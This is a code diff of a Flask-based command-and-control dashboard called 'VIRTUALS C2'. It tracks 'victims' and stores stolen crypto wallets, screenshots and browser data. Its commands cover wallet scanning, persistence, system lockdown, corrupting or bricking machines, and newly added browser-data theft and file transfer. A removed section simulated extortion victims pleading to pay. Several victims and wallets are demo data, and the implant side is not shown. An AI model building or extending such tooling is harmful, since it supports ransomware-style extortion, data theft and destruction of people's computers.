@@ -1,10 +1,10 @@
 """
-VIRTUALS C2 - SPACE EDITION
-Moving Space Background · Persistent Victims · Realistic Behavior
+VIRTUALS C2 - SITE
+Beautiful GUI with Space Background · All Commands · Victim Management
 BY: YOUR STAR BESTIE
 """
 
-from flask import Flask, request, jsonify, send_file
+from flask import Flask, request, jsonify, send_file, send_from_directory
 import sqlite3
 import datetime
 import random
@@ -16,80 +16,82 @@ import re
 import uuid
 import threading
 import time
+import shutil
+import zipfile
+from io import BytesIO
 
 app = Flask(__name__)
 
 # Create required folders
-folders = ['screenshots', 'wallet_data', 'logs', 'outputs', 'vm_logs']
+folders = ['screenshots', 'wallet_data', 'logs', 'outputs', 'vm_logs', 'browser_data', 'downloads', 'uploads']
 for folder in folders:
     if not os.path.exists(folder):
         os.makedirs(folder)
 
 # ============================================
-# REALISTIC BEHAVIOR ENGINE
+# DATABASE SYSTEM
 # ============================================
-class BehaviorEngine:
-    """Makes test subjects act like real humans"""
-    
-    @staticmethod
-    def get_random_behavior():
-        behaviors = [
-            {'type': 'typing', 'message': 'is typing...', 'duration': random.randint(2, 8)},
-            {'type': 'idle', 'message': 'is idle', 'duration': random.randint(5, 15)},
-            {'type': 'reading', 'message': 'is reading', 'duration': random.randint(3, 10)},
-            {'type': 'responding', 'message': 'is responding', 'duration': random.randint(2, 5)},
-            {'type': 'thinking', 'message': 'is thinking...', 'duration': random.randint(3, 7)},
-            {'type': 'afk', 'message': 'is AFK', 'duration': random.randint(10, 30)},
-            {'type': 'processing', 'message': 'is processing', 'duration': random.randint(4, 12)},
-        ]
-        return random.choice(behaviors)
-    
-    @staticmethod
-    def get_response(question):
-        """Generate realistic human responses"""
-        responses = {
-            'whois': [
-                'my pc is pretty fast actually',
-                'i have a gaming pc, it\'s decent',
-                'it\'s a work laptop, nothing special',
-                'i built this myself, it\'s okay',
-                'it\'s a bit old but works fine'
-            ],
-            'payment': [
-                'i\'ll pay, just give me a minute',
-                'okay okay, i\'ll send it',
-                'fine, i\'ll pay',
-                'wait, let me find my wallet',
-                'i need to check my balance first'
-            ],
-            'threat': [
-                'i don\'t want to lose my files',
-                'please don\'t destroy my pc',
-                'i have important work on here',
-                'okay, i\'ll do what you want',
-                'this is crazy, but okay'
-            ],
-            'default': [
-                'what do you want?',
-                'i don\'t understand',
-                'please just leave me alone',
-                'okay, okay, i\'m listening',
-                'what is this about?'
-            ]
-        }
-        
-        category = 'default'
-        if 'whois' in question.lower() or 'pc' in question.lower():
-            category = 'whois'
-        elif 'pay' in question.lower() or 'money' in question.lower():
-            category = 'payment'
-        elif 'destroy' in question.lower() or 'brick' in question.lower():
-            category = 'threat'
-            
-        return random.choice(responses.get(category, responses['default']))
+def get_db():
+    conn = sqlite3.connect('virtuals_c2.db')
+    c = conn.cursor()
+    c.execute('''CREATE TABLE IF NOT EXISTS victims (
+        id TEXT PRIMARY KEY,
+        pc TEXT,
+        ip TEXT,
+        os TEXT,
+        status TEXT,
+        is_vm INTEGER DEFAULT 0,
+        vm_details TEXT,
+        first_seen TEXT,
+        last_seen TEXT,
+        payment_status TEXT DEFAULT 'pending',
+        behavior TEXT DEFAULT 'idle',
+        behavior_timer INTEGER DEFAULT 0,
+        behavior_message TEXT DEFAULT ''
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS commands (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        victim_id TEXT,
+        command TEXT,
+        result TEXT,
+        timestamp TEXT
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS outputs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        victim_id TEXT,
+        type TEXT,
+        title TEXT,
+        content TEXT,
+        timestamp TEXT
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS wallets (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        victim_id TEXT,
+        currency TEXT,
+        address TEXT,
+        balance REAL,
+        usd_value REAL,
+        timestamp TEXT
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        victim_id TEXT,
+        filename TEXT,
+        timestamp TEXT
+    )''')
+    c.execute('''CREATE TABLE IF NOT EXISTS browser_data (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        victim_id TEXT,
+        browser TEXT,
+        data_type TEXT,
+        data TEXT,
+        timestamp TEXT
+    )''')
+    conn.commit()
+    return conn
 
 # ============================================
-# VM DETECTION SYSTEM - SAFE MODE
+# VM DETECTION
 # ============================================
 class VMDetector:
     @staticmethod
@@ -252,101 +254,7 @@ class VMDetector:
         return details
 
 # ============================================
-# PERSISTENT DATABASE
-# ============================================
-def get_db():
-    conn = sqlite3.connect('virtuals_c2.db')
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS victims (
-        id TEXT PRIMARY KEY,
-        pc TEXT,
-        ip TEXT,
-        os TEXT,
-        status TEXT,
-        is_vm INTEGER DEFAULT 0,
-        vm_details TEXT,
-        first_seen TEXT,
-        last_seen TEXT,
-        payment_status TEXT DEFAULT 'pending',
-        behavior TEXT DEFAULT 'idle',
-        behavior_timer INTEGER DEFAULT 0
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS commands (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        command TEXT,
-        result TEXT,
-        timestamp TEXT
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS outputs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        type TEXT,
-        title TEXT,
-        content TEXT,
-        timestamp TEXT
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS wallets (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        currency TEXT,
-        address TEXT,
-        balance REAL,
-        usd_value REAL,
-        timestamp TEXT
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        filename TEXT,
-        timestamp TEXT
-    )''')
-    c.execute('''CREATE TABLE IF NOT EXISTS vm_events (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        event TEXT,
-        details TEXT,
-        timestamp TEXT
-    )''')
-    conn.commit()
-    return conn
-
-# ============================================
-# REALISTIC VICTIM BEHAVIOR THREAD
-# ============================================
-def behavior_thread():
-    """Simulates realistic human behavior for victims"""
-    while True:
-        time.sleep(5)  # Check every 5 seconds
-        conn = get_db()
-        c = conn.cursor()
-        
-        # Get all online victims
-        c.execute("SELECT id, behavior, behavior_timer FROM victims WHERE status = 'Online'")
-        victims = c.fetchall()
-        
-        for victim_id, current_behavior, timer in victims:
-            # Decrement timer
-            new_timer = timer - 5 if timer > 0 else 0
-            
-            if new_timer <= 0:
-                # Get new random behavior
-                behavior = BehaviorEngine.get_random_behavior()
-                c.execute("UPDATE victims SET behavior = ?, behavior_timer = ? WHERE id = ?",
-                         (behavior['type'], behavior['duration'] * 60, victim_id))
-            else:
-                c.execute("UPDATE victims SET behavior_timer = ? WHERE id = ?",
-                         (new_timer, victim_id))
-        
-        conn.commit()
-        conn.close()
-
-# Start behavior thread
-behavior_thread = threading.Thread(target=behavior_thread, daemon=True)
-behavior_thread.start()
-
-# ============================================
-# SAMPLE WALLET DATA WITH BALANCES
+# SAMPLE WALLET DATA
 # ============================================
 SAMPLE_WALLETS = {
     "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000},
@@ -357,27 +265,16 @@ SAMPLE_WALLETS = {
 }
 
 # ============================================
-# HTML DASHBOARD - SPACE EDITION
+# HTML DASHBOARD
 # ============================================
 HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VIRTUALS C2 - SPACE EDITION</title>
+    <title>VIRTUALS C2</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        /* --- SPACE BACKGROUND --- */
-        body {
-            background: #0a0a12;
-            color: #c8c8d0;
-            font-family: 'Segoe UI', 'Courier New', monospace;
-            height: 100vh;
-            overflow: hidden;
-            font-size: 13px;
-            position: relative;
-        }
         
         #space-bg {
             position: fixed;
@@ -409,40 +306,38 @@ HTML = """
             100% { opacity: 0; transform: scale(0.5); }
         }
         
-        @keyframes float {
-            0% { transform: translateY(0px) translateX(0px); }
-            25% { transform: translateY(-3px) translateX(2px); }
-            50% { transform: translateY(0px) translateX(-1px); }
-            75% { transform: translateY(3px) translateX(1px); }
-            100% { transform: translateY(0px) translateX(0px); }
+        body {
+            background: #0a0a12;
+            color: #c8c8d0;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            height: 100vh;
+            overflow: hidden;
+            font-size: 13px;
+            position: relative;
         }
         
-        /* --- SCROLLBAR --- */
         ::-webkit-scrollbar { width: 4px; height: 4px; }
         ::-webkit-scrollbar-track { background: rgba(255,255,255,0.03); }
         ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 2px; }
         ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.25); }
 
-        /* --- GLASS PANEL EFFECT --- */
         .glass {
-            background: rgba(10, 10, 18, 0.75);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            background: rgba(10, 10, 18, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
             border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 6px;
             position: relative;
             z-index: 1;
-            transition: border-color 0.3s, box-shadow 0.3s;
+            transition: border-color 0.3s;
         }
         
         .glass:hover {
             border-color: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 30px rgba(100, 150, 255, 0.03);
         }
 
-        /* --- HEADER --- */
         .header {
-            background: rgba(10, 10, 18, 0.85);
+            background: rgba(10, 10, 18, 0.9);
             backdrop-filter: blur(10px);
             padding: 8px 20px;
             border-bottom: 1px solid rgba(255,255,255,0.05);
@@ -475,7 +370,6 @@ HTML = """
             margin-left: 4px;
         }
 
-        /* --- LAYOUT --- */
         .container {
             display: flex;
             height: calc(100vh - 44px);
@@ -485,10 +379,9 @@ HTML = """
             z-index: 1;
         }
 
-        /* --- LEFT PANEL --- */
         .left-panel {
-            width: 140px;
-            min-width: 140px;
+            width: 160px;
+            min-width: 160px;
             display: flex;
             flex-direction: column;
             gap: 8px;
@@ -511,18 +404,17 @@ HTML = """
         .cmd-btn {
             display: block;
             width: 100%;
-            padding: 5px 8px;
-            margin: 3px 0;
+            padding: 4px 8px;
+            margin: 2px 0;
             background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.05);
             border-radius: 4px;
             color: #b0b0c0;
             font-family: inherit;
-            font-size: 11px;
+            font-size: 10px;
             cursor: pointer;
             text-align: left;
             transition: all 0.25s;
-            position: relative;
         }
         .cmd-btn:hover {
             background: rgba(255,255,255,0.06);
@@ -530,20 +422,20 @@ HTML = """
             color: #e8e8f0;
             transform: translateX(2px);
         }
-        .cmd-btn:active {
-            transform: scale(0.98);
-        }
         .cmd-btn .desc {
             color: #555568;
-            font-size: 9px;
+            font-size: 8px;
             display: block;
         }
         .cmd-btn.danger { border-color: rgba(200, 60, 60, 0.2); color: #cc8888; }
-        .cmd-btn.danger:hover { border-color: rgba(200, 60, 60, 0.4); background: rgba(200, 60, 60, 0.05); }
+        .cmd-btn.danger:hover { border-color: rgba(200, 60, 60, 0.4); }
         .cmd-btn.brick { border-color: rgba(200, 130, 50, 0.2); color: #ccaa88; }
-        .cmd-btn.brick:hover { border-color: rgba(200, 130, 50, 0.4); background: rgba(200, 130, 50, 0.05); }
+        .cmd-btn.brick:hover { border-color: rgba(200, 130, 50, 0.4); }
+        .cmd-btn.steal { border-color: rgba(50, 180, 200, 0.2); color: #88ccdd; }
+        .cmd-btn.steal:hover { border-color: rgba(50, 180, 200, 0.4); }
+        .cmd-btn.file { border-color: rgba(180, 180, 50, 0.2); color: #ccdd88; }
+        .cmd-btn.file:hover { border-color: rgba(180, 180, 50, 0.4); }
 
-        /* --- MIDDLE PANEL --- */
         .middle-panel {
             flex: 1;
             display: flex;
@@ -552,10 +444,9 @@ HTML = """
             min-width: 250px;
         }
 
-        /* --- VICTIM LIST --- */
         .victims-panel {
             padding: 10px 12px;
-            height: 38%;
+            height: 30%;
             overflow: hidden;
             display: flex;
             flex-direction: column;
@@ -572,7 +463,7 @@ HTML = """
         }
         .victim-list {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
             gap: 6px;
             overflow-y: auto;
             flex: 1;
@@ -583,12 +474,10 @@ HTML = """
             background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.06);
             border-radius: 4px;
-            padding: 6px 10px;
+            padding: 5px 8px;
             cursor: pointer;
             transition: all 0.3s;
             position: relative;
-            animation: float 4s ease-in-out infinite;
-            animation-delay: calc(var(--delay, 0) * 1s);
         }
         .victim-card:hover {
             background: rgba(255,255,255,0.05);
@@ -608,7 +497,7 @@ HTML = """
         }
         .victim-card .name {
             color: #e8e8f0;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: 500;
             white-space: nowrap;
             overflow: hidden;
@@ -616,7 +505,7 @@ HTML = """
         }
         .victim-card .ip {
             color: #666680;
-            font-size: 10px;
+            font-size: 9px;
         }
         .victim-card .bottom {
             display: flex;
@@ -639,7 +528,6 @@ HTML = """
         }
         .victim-card .status .dot.online { background: #44aa88; }
         .victim-card .status .dot.offline { background: #664444; }
-        .victim-card .status .dot.idle { background: #6688aa; }
         
         @keyframes pulse-dot {
             0%, 100% { opacity: 1; }
@@ -649,7 +537,7 @@ HTML = """
         .victim-card .vm-badge {
             background: rgba(200, 60, 60, 0.15);
             color: #cc8888;
-            font-size: 8px;
+            font-size: 7px;
             padding: 0 6px;
             border-radius: 10px;
             line-height: 14px;
@@ -660,18 +548,7 @@ HTML = """
             color: #666680;
             font-style: italic;
         }
-        .victim-card .behavior .dots::after {
-            content: '...';
-            animation: dots 1.5s infinite;
-        }
-        @keyframes dots {
-            0% { content: ''; }
-            33% { content: '.'; }
-            66% { content: '..'; }
-            100% { content: '...'; }
-        }
 
-        /* --- CHAT PANEL --- */
         .chat-panel {
             padding: 10px 12px;
             flex: 1;
@@ -702,11 +579,13 @@ HTML = """
         }
         .chat-messages .msg { padding: 1px 0; opacity: 0.9; }
         .chat-messages .time { color: #555568; margin-right: 8px; font-size: 10px; }
-        .chat-messages .sender.bot { color: #66bbaa; font-weight: 400; }
+        .chat-messages .sender.us { color: #66bbaa; font-weight: 400; }
         .chat-messages .sender.victim { color: #bbaa88; }
         .chat-messages .sender.system { color: #666680; }
         .chat-messages .sender.notification { color: #88aacc; }
         .chat-messages .sender.behavior { color: #8888aa; font-style: italic; }
+        .chat-messages .sender.file { color: #ccdd88; }
+        .chat-messages .sender.steal { color: #88ccdd; }
         
         .chat-input-area {
             display: flex;
@@ -744,7 +623,6 @@ HTML = """
             border-color: rgba(255,255,255,0.12);
         }
 
-        /* --- RIGHT PANEL --- */
         .right-panel {
             width: 240px;
             min-width: 240px;
@@ -776,7 +654,6 @@ HTML = """
         }
         .detail-item .label { color: #555568; }
         .detail-item .value { color: #c8c8d0; }
-        .detail-item .value .highlight { color: #88aacc; }
 
         .screenshot-gallery {
             display: flex;
@@ -798,7 +675,7 @@ HTML = """
             color: #555568;
             transition: all 0.25s;
         }
-        .screenshot-thumb:hover { border-color: rgba(255,255,255,0.15); background: rgba(255,255,255,0.04); }
+        .screenshot-thumb:hover { border-color: rgba(255,255,255,0.15); }
 
         .output-panel {
             padding: 10px 12px;
@@ -833,12 +710,33 @@ HTML = """
         .output-item .type.failed { background: rgba(180, 50, 50, 0.15); color: #cc8888; }
         .output-item .type.info { background: rgba(50, 80, 180, 0.15); color: #88aacc; }
         .output-item .type.wallet { background: rgba(180, 130, 50, 0.15); color: #ccaa88; }
+        .output-item .type.steal { background: rgba(50, 180, 200, 0.15); color: #88ccdd; }
+        .output-item .type.file { background: rgba(180, 180, 50, 0.15); color: #ccdd88; }
 
-        /* --- RESPONSIVE --- */
+        .behavior-channel {
+            background: rgba(0,0,0,0.2);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 4px;
+            padding: 6px 8px;
+            max-height: 80px;
+            overflow-y: auto;
+            font-size: 10px;
+            margin-top: 4px;
+        }
+        .behavior-channel .entry {
+            padding: 1px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+            display: flex;
+            justify-content: space-between;
+        }
+        .behavior-channel .entry .pc { color: #8888aa; }
+        .behavior-channel .entry .action { color: #666680; font-style: italic; }
+        .behavior-channel .entry .time { color: #444458; font-size: 9px; }
+
         @media (max-width: 1024px) {
             .left-panel { width: 120px; min-width: 120px; }
             .right-panel { width: 200px; min-width: 200px; }
-            .victim-list { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+            .victim-list { grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); }
         }
         @media (max-width: 768px) {
             .container { flex-direction: column; }
@@ -854,10 +752,8 @@ HTML = """
     </style>
 </head>
 <body>
-    <!-- SPACE BACKGROUND -->
     <div id="space-bg"></div>
     
-    <!-- HEADER -->
     <div class="header">
         <h1>◈ VIRTUALS <span>C2</span></h1>
         <div class="stats">
@@ -865,13 +761,10 @@ HTML = """
             <span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
             <span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
             <span class="stat-item">COMMANDS <span class="num" id="cmdCount">0</span></span>
-            <span class="stat-item">NOTIFICATIONS <span class="num" id="notifCount">0</span></span>
         </div>
     </div>
     
-    <!-- CONTAINER -->
     <div class="container">
-        <!-- LEFT PANEL -->
         <div class="left-panel">
             <div class="commands-panel glass">
                 <div class="title">Commands</div>
@@ -881,6 +774,9 @@ HTML = """
                 <button class="cmd-btn" onclick="sendCommand('scan')">scan <span class="desc">crypto wallets</span></button>
                 <button class="cmd-btn" onclick="sendCommand('persist')">persist <span class="desc">persistence</span></button>
                 <button class="cmd-btn" onclick="sendCommand('lockdown')">lockdown <span class="desc">lock system</span></button>
+                <button class="cmd-btn steal" onclick="sendCommand('steal')">steal <span class="desc">browser data</span></button>
+                <button class="cmd-btn file" onclick="sendCommand('upload')">upload <span class="desc">upload file</span></button>
+                <button class="cmd-btn file" onclick="sendCommand('download')">download <span class="desc">download file</span></button>
                 <button class="cmd-btn danger" onclick="sendCommand('destroy')">destroy <span class="desc">corrupt system</span></button>
                 <button class="cmd-btn brick" onclick="sendCommand('brick')">brick <span class="desc">permanent brick</span></button>
                 <button class="cmd-btn" onclick="sendCommand('vmcheck')">vmcheck <span class="desc">vm detection</span></button>
@@ -888,12 +784,14 @@ HTML = """
             </div>
         </div>
         
-        <!-- MIDDLE PANEL -->
         <div class="middle-panel">
             <div class="victims-panel glass">
                 <div class="title">Victims</div>
                 <div class="victim-list" id="victimList">
                     <div style="color:#555568;font-size:11px;text-align:center;padding:10px;">No victims connected</div>
+                </div>
+                <div class="behavior-channel" id="behaviorChannel">
+                    <div style="color:#444458;font-size:10px;text-align:center;">Behavior monitor active</div>
                 </div>
             </div>
             <div class="chat-panel glass">
@@ -908,7 +806,6 @@ HTML = """
             </div>
         </div>
         
-        <!-- RIGHT PANEL -->
         <div class="right-panel">
             <div class="details-panel glass">
                 <div class="title">Victim Details</div>
@@ -932,7 +829,6 @@ HTML = """
         function generateStars() {
             const container = document.getElementById('space-bg');
             const starCount = 400;
-            
             for (let i = 0; i < starCount; i++) {
                 const star = document.createElement('div');
                 const size = Math.random();
@@ -940,14 +836,12 @@ HTML = """
                 if (size < 0.33) className = 'star-layer-1';
                 else if (size < 0.66) className = 'star-layer-2';
                 else className = 'star-layer-3';
-                
                 star.className = `star ${className}`;
                 star.style.left = Math.random() * 100 + '%';
                 star.style.top = Math.random() * 100 + '%';
                 star.style.setProperty('--duration', (3 + Math.random() * 5) + 's');
                 star.style.animationDelay = (Math.random() * 5) + 's';
                 star.style.opacity = 0.2 + Math.random() * 0.6;
-                
                 container.appendChild(star);
             }
         }
@@ -983,6 +877,7 @@ HTML = """
                     state.victims = data.victims;
                     renderVictims();
                     updateStats();
+                    updateBehaviorChannel();
                 }
             });
         }
@@ -994,17 +889,8 @@ HTML = """
                 container.innerHTML = '<div style="color:#555568;font-size:11px;text-align:center;padding:10px;">No victims connected</div>';
                 return;
             }
-            
-            container.innerHTML = victims.map((v, index) => {
-                const behaviorDisplay = v.behavior || 'idle';
-                const behaviorText = behaviorDisplay === 'idle' ? 'idle' : 
-                                    behaviorDisplay === 'typing' ? 'typing...' : 
-                                    behaviorDisplay === 'afk' ? 'away' : behaviorDisplay;
-                
-                return `
-                <div class="victim-card ${state.selectedVictim === v.id ? 'selected' : ''}" 
-                     onclick="selectVictim('${v.id}')"
-                     style="--delay: ${index * 0.2}">
+            container.innerHTML = victims.map(v => `
+                <div class="victim-card ${state.selectedVictim === v.id ? 'selected' : ''}" onclick="selectVictim('${v.id}')">
                     <div class="top">
                         <span class="name">${v.pc}</span>
                         <span class="ip">${v.ip}</span>
@@ -1015,10 +901,26 @@ HTML = """
                             ${v.status}
                         </span>
                         ${v.is_vm ? '<span class="vm-badge">VM</span>' : ''}
-                        <span class="behavior">${behaviorText}</span>
+                        <span class="behavior">${v.behavior || 'idle'}</span>
                     </div>
                 </div>
-            `}).join('');
+            `).join('');
+        }
+        
+        function updateBehaviorChannel() {
+            const container = document.getElementById('behaviorChannel');
+            const victims = Object.values(state.victims).filter(v => v.status === 'Online');
+            if (victims.length === 0) {
+                container.innerHTML = '<div style="color:#444458;font-size:10px;text-align:center;">No active victims</div>';
+                return;
+            }
+            container.innerHTML = victims.map(v => `
+                <div class="entry">
+                    <span class="pc">${v.pc}</span>
+                    <span class="action">${v.behavior || 'idle'}</span>
+                    <span class="time">${v.behavior_message || ''}</span>
+                </div>
+            `).join('');
         }
         
         function selectVictim(id) {
@@ -1031,8 +933,6 @@ HTML = """
         function showVictimDetails(id) {
             const v = state.victims[id];
             if (!v) return;
-            
-            const behaviorText = v.behavior || 'idle';
             document.getElementById('victimDetails').innerHTML = `
                 <div class="detail-item"><span class="label">id</span><span class="value">${v.id}</span></div>
                 <div class="detail-item"><span class="label">pc</span><span class="value">${v.pc}</span></div>
@@ -1040,7 +940,7 @@ HTML = """
                 <div class="detail-item"><span class="label">os</span><span class="value">${v.os || 'unknown'}</span></div>
                 <div class="detail-item"><span class="label">status</span><span class="value" style="color:${v.status==='Online'?'#66bbaa':'#886666'}">${v.status}</span></div>
                 <div class="detail-item"><span class="label">vm</span><span class="value" style="color:${v.is_vm?'#cc8888':'#66bbaa'}">${v.is_vm ? 'detected' : 'clean'}</span></div>
-                <div class="detail-item"><span class="label">behavior</span><span class="value" style="color:#88aacc;">${behaviorText}</span></div>
+                <div class="detail-item"><span class="label">behavior</span><span class="value" style="color:#88aacc;">${v.behavior || 'idle'}</span></div>
                 <div class="detail-item"><span class="label">commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>
             `;
         }
@@ -1070,7 +970,6 @@ HTML = """
             document.getElementById('onlineCount').textContent = victims.filter(v => v.status === 'Online').length;
             document.getElementById('vmCount').textContent = victims.filter(v => v.is_vm).length;
             document.getElementById('cmdCount').textContent = state.cmdCount;
-            document.getElementById('notifCount').textContent = state.notifications;
         }
         
         // ============================================
@@ -1082,7 +981,7 @@ HTML = """
                 return;
             }
             
-            addMessage('bot', 'executing /' + command + ' on ' + state.selectedVictim, 'bot');
+            addMessage('us', 'executing /' + command + ' on ' + state.selectedVictim, 'us');
             
             api('sendCommand', { victim_id: state.selectedVictim, command: command }, data => {
                 if (data.success) {
@@ -1093,35 +992,32 @@ HTML = """
                         time: new Date().toLocaleTimeString()
                     });
                     state.cmdCount++;
-                    state.notifications++;
                     
-                    addMessage('bot', 'success: ' + command, 'bot');
+                    addMessage('us', 'success: ' + command, 'us');
                     addMessage('notification', command + ' executed on ' + state.selectedVictim, 'notification');
                     
                     const outputEl = document.getElementById('commandOutput');
-                    outputEl.innerHTML = '<div class="output-item"><span class="type success">success</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + data.result + '</div>' + outputEl.innerHTML;
+                    let typeClass = 'success';
+                    if (command === 'steal') typeClass = 'steal';
+                    else if (command === 'upload' || command === 'download') typeClass = 'file';
+                    outputEl.innerHTML = '<div class="output-item"><span class="type ' + typeClass + '">' + command + '</span>[' + new Date().toLocaleTimeString() + '] ' + data.result + '</div>' + outputEl.innerHTML;
                     
                     if (command === 'scan' && data.wallets) {
                         data.wallets.forEach(w => {
                             addMessage('wallet', w.currency + ': ' + w.balance + ' ($' + w.usd + ')', 'wallet');
                         });
-                        state.notifications++;
                     }
                     
-                    if (command === 'vmcheck' && data.is_vm) {
-                        addMessage('system', 'VM detected on ' + state.selectedVictim + ' (confidence: ' + data.confidence + '%) - safe mode: no action taken', 'system');
-                        addMessage('notification', 'VM detected on ' + state.selectedVictim + ' - safe mode', 'notification');
+                    if (command === 'steal' && data.browsers) {
+                        addMessage('steal', 'Data stolen from ' + data.browsers + ' browsers', 'steal');
                     }
                     
                     showVictimDetails(state.selectedVictim);
                     updateStats();
                 } else {
-                    state.notifications++;
-                    addMessage('bot', 'failed: ' + command, 'bot');
-                    addMessage('notification', command + ' failed on ' + state.selectedVictim, 'notification');
+                    addMessage('us', 'failed: ' + command, 'us');
                     const outputEl = document.getElementById('commandOutput');
                     outputEl.innerHTML = '<div class="output-item"><span class="type failed">failed</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + (data.error || 'unknown error') + '</div>' + outputEl.innerHTML;
-                    updateStats();
                 }
             });
         }
@@ -1139,10 +1035,8 @@ HTML = """
                     addMessage('system', 'select a victim first', 'system');
                     return;
                 }
-                addMessage('bot', 'sending: ' + msg, 'bot');
+                addMessage('us', 'sending: ' + msg, 'us');
                 addMessage('victim', msg, 'victim');
-                state.notifications++;
-                updateStats();
             }
         }
         
@@ -1153,35 +1047,34 @@ HTML = """
             const container = document.getElementById('chatMessages');
             const time = new Date().toLocaleTimeString();
             let senderClass = 'system';
-            if (type === 'bot') senderClass = 'bot';
+            if (type === 'us') senderClass = 'us';
             else if (type === 'victim') senderClass = 'victim';
             else if (type === 'notification') senderClass = 'notification';
             else if (type === 'wallet') senderClass = 'wallet';
             else if (type === 'behavior') senderClass = 'behavior';
+            else if (type === 'steal') senderClass = 'steal';
+            else if (type === 'file') senderClass = 'file';
             
             container.innerHTML += '<div class="msg"><span class="time">[' + time + ']</span><span class="sender ' + senderClass + '">' + sender + '</span> ' + message + '</div>';
             container.scrollTop = container.scrollHeight;
         }
         
         // ============================================
-        // DEMO VICTIMS - PERSISTENT
+        // DEMO VICTIMS
         // ============================================
         function loadDemoVictims() {
-            // Check if we already have victims (persistent)
             if (Object.keys(state.victims).length > 0) return;
             
-            // Add persistent demo victims
             const fake = [
-                { id: 'SNIN-1001', pc: 'DESKTOP-ALPHA', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0, behavior: 'idle' },
-                { id: 'SNIN-1002', pc: 'LAPTOP-BETA', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0, behavior: 'idle' },
-                { id: 'SNIN-1003', pc: 'WORKSTATION-GAMMA', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 0, behavior: 'idle' },
-                { id: 'SNIN-1004', pc: 'VM-TEST-01', ip: '192.168.1.13', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation', behavior: 'idle' },
-                { id: 'SNIN-1005', pc: 'DESKTOP-DELTA', ip: '192.168.1.14', os: 'Windows 11 Pro', status: 'Online', is_vm: 0, behavior: 'idle' }
+                { id: 'SNIN-1001', pc: 'DESKTOP-ALPHA', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0, behavior: 'idle', behavior_message: '' },
+                { id: 'SNIN-1002', pc: 'LAPTOP-BETA', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0, behavior: 'typing...', behavior_message: 'typing...' },
+                { id: 'SNIN-1003', pc: 'WORKSTATION-GAMMA', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 0, behavior: 'idle', behavior_message: '' },
+                { id: 'SNIN-1004', pc: 'VM-TEST-01', ip: '192.168.1.13', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation', behavior: 'away', behavior_message: '' },
+                { id: 'SNIN-1005', pc: 'DESKTOP-DELTA', ip: '192.168.1.14', os: 'Windows 11 Pro', status: 'Online', is_vm: 0, behavior: 'reading', behavior_message: 'reading' }
             ];
             
             fake.forEach(v => { 
                 state.victims[v.id] = v; 
-                // Also store in database
                 api('registerVictim', { 
                     victim_id: v.id, 
                     pc: v.pc, 
@@ -1194,26 +1087,8 @@ HTML = """
             
             renderVictims();
             updateStats();
-            addMessage('system', 'victims loaded - behavior engine active', 'system');
+            addMessage('system', 'victims loaded - behavior monitor active', 'system');
             selectVictim(fake[0].id);
-            
-            // Add realistic behavior messages periodically
-            setInterval(() => {
-                const onlineVictims = Object.values(state.victims).filter(v => v.status === 'Online');
-                if (onlineVictims.length > 0) {
-                    const randomVictim = onlineVictims[Math.floor(Math.random() * onlineVictims.length)];
-                    const behaviors = [
-                        randomVictim.pc + ' is typing...',
-                        randomVictim.pc + ' is idle',
-                        randomVictim.pc + ' is reading',
-                        randomVictim.pc + ' is responding',
